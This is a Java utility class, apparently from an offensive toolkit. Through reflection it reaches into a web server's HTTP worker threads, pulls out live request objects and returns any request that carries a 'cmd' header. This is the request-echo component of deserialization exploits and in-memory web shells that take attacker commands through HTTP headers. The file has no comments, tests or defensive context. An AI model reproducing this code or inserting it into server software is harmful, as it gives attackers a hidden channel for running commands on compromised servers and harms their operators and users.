package com.flux;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

public class Utils {
    public static List<Object> getRequest() {
        try {
            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

            for (Thread thread : threads) {
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        Object target = getField(thread, "target");
                        if (target instanceof Runnable) {
                            try {
                                target = getField(getField(getField(target, "this$0"), "handler"), "global");
                            } catch (Exception var11) {
                                continue;
                            }

                            List processors = (List) getField(target, "processors");

                            for (Object processor : processors) {
                                target = getField(processor, "req");

                                threadName = (String) target.getClass().getMethod("getHeader", String.class)
                                        .invoke(target, new String("cmd"));
                                if (threadName != null && !threadName.isEmpty()) {

                                    Object       note = target.getClass().getDeclaredMethod("getNote", int.class).invoke(target, 1);
                                    Object       req  = note.getClass().getDeclaredMethod("getRequest").invoke(note);
                                    List<Object> list = new ArrayList<Object>();
                                    list.add(req);
                                    list.add(threadName);
                                    return list;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }

        return new ArrayList<Object>();
    }

    public static Object getField(Object object, String fieldName) throws Exception {
        Field field = null;
        Class clazz = object.getClass();

        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field == null) {
            throw new NoSuchFieldException(fieldName);
        } else {
            field.setAccessible(true);
            return field.get(object);
        }
    }

    public static Object invokeMethod(Object obj, String str) throws Exception {
        return invokeMethod(obj, str, new Class[0], new Object[0]);
    }

    public static Object invokeMethod(Object obj ,String str ,Class<?>[] clsArr, Object[] objArr) throws Exception{
        Class<? super Object> cls = obj instanceof Class ? (Class) obj : (Class<? super Object>) obj.getClass();
        Method method = null;
        while (cls != null && method == null) {
            if (clsArr == null) {
                try {
                    method = cls.getDeclaredMethod(str, new Class[0]);
                } catch (NoSuchMethodException e) {
                    cls = cls.getSuperclass();
                }
            } else {
                method = cls.getDeclaredMethod(str, clsArr);
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + str);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, objArr);
    }
}
